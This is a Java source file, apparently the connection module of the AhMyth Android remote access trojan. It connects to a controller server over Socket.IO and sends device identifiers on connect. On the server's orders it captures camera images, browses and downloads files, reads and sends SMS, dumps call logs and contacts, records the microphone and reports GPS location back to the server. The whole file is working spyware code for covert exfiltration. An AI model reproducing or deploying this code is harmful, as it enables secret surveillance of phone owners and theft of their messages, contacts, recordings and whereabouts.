package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONObject;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;
import com.github.nkzawa.emitter.Emitter;
import java.net.URISyntaxException;

public class ConnectionManager {
    private static final String TAG = "ConnectionManager";
    public static Context context;
    private static Socket ioSocket;
    private static boolean isConnected = false;
    private static ConnectionManager instance;

    private ConnectionManager(Context context) {
        this.context = context;
        initializeSocket();
    }

    public static synchronized ConnectionManager getInstance(Context context) {
        if (instance == null) {
            instance = new ConnectionManager(context);
        }
        return instance;
    }

    private void initializeSocket() {
        try {
            Log.d(TAG, "Initializing socket connection...");
            
            // Create connection options for Socket.IO v0.9.x
            IO.Options opts = new IO.Options();
            opts.forceNew = true;
            opts.reconnection = true;
            opts.timeout = 10000;
            opts.transports = new String[]{"websocket", "polling"};
            
            String url = "http://" + Config.IP + ":" + Config.PORT;
            Log.d(TAG, "Connecting to: " + url + " with options: " + opts.toString());
            
            ioSocket = IO.socket(url, opts);
            
            ioSocket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d(TAG, "Socket connected successfully");
                    try {
                        JSONObject deviceInfo = new JSONObject();
                        deviceInfo.put("model", android.os.Build.MODEL);
                        deviceInfo.put("manf", android.os.Build.MANUFACTURER);
                        deviceInfo.put("release", android.os.Build.VERSION.RELEASE);
                        deviceInfo.put("id", android.provider.Settings.Secure.getString(
                            context.getContentResolver(), 
                            android.provider.Settings.Secure.ANDROID_ID
                        ));
                        Log.d(TAG, "Sending device info: " + deviceInfo.toString());
                        ioSocket.emit("join", deviceInfo);
                    } catch (Exception e) {
                        Log.e(TAG, "Error sending device info: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            });

            ioSocket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d(TAG, "Socket disconnected");
                }
            });

            ioSocket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.e(TAG, "Connection error: " + args[0]);
                    if (args[0] instanceof Exception) {
                        Exception e = (Exception) args[0];
                        Log.e(TAG, "Detailed error: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            });

            ioSocket.on("ping", args -> {
                Log.d(TAG, "Received ping");
                ioSocket.emit("pong");
            });

            ioSocket.on("order", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String order = data.getString("order");
                    Log.d(TAG, "Received order: " + order);
                    switch (order) {
                        case "x0000ca":
                            if(data.getString("extra").equals("camList"))
                                x0000ca(-1);
                            else if (data.getString("extra").equals("1"))
                                x0000ca(1);
                            else if (data.getString("extra").equals("0"))
                                x0000ca(0);
                            break;
                        case "x0000fm":
                            if (data.getString("extra").equals("ls"))
                                x0000fm(0,data.getString("path"));
                            else if (data.getString("extra").equals("dl"))
                                x0000fm(1,data.getString("path"));
                            break;
                        case "x0000sm":
                            if(data.getString("extra").equals("ls"))
                                x0000sm(0,null,null);
                            else if(data.getString("extra").equals("sendSMS"))
                                x0000sm(1,data.getString("to"), data.getString("sms"));
                            break;
                        case "x0000cl":
                            x0000cl();
                            break;
                        case "x0000cn":
                            x0000cn();
                            break;
                        case "x0000mc":
                            x0000mc(data.getInt("sec"));
                            break;
                        case "x0000lm":
                            x0000lm();
                            break;
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error handling order", e);
                }
            });

            ioSocket.connect();
        } catch (URISyntaxException e) {
            Log.e(TAG, "Socket connection error", e);
        }
    }

    public static void stopConnection() {
        if (ioSocket != null) {
            ioSocket.disconnect();
            ioSocket.off();
        }
        isConnected = false;
    }

    public static Socket getSocket() {
        return ioSocket;
    }

    public static boolean isConnected() {
        return isConnected;
    }

    public static void x0000ca(int req) {
        if(req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if(cameraList != null)
                ioSocket.emit("x0000ca", cameraList);
        }
        else if (req == 1) {
            new CameraManager(context).startUp(1);
        }
        else if (req == 0) {
            new CameraManager(context).startUp(0);
        }
    }

    public static void x0000fm(int req, String path) {
        if(req == 0)
            ioSocket.emit("x0000fm", FileManager.walk(path));
        else if (req == 1)
            FileManager.downloadFile(path);
    }

    public static void x0000sm(int req, String phoneNo, String msg) {
        if(req == 0)
            ioSocket.emit("x0000sm", SMSManager.getSMSList());
        else if(req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl() {
        ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
    }

    public static void x0000cn() {
        ioSocket.emit("x0000cn", ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception {
        LocManager gps = new LocManager(context);
        if(gps.canGetLocation()) {
            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc", latitude + "   ,  " + longitude);
            JSONObject location = new JSONObject();
            location.put("lat", latitude);
            location.put("lng", longitude);
            ioSocket.emit("x0000lm", location);
        }
    }
} 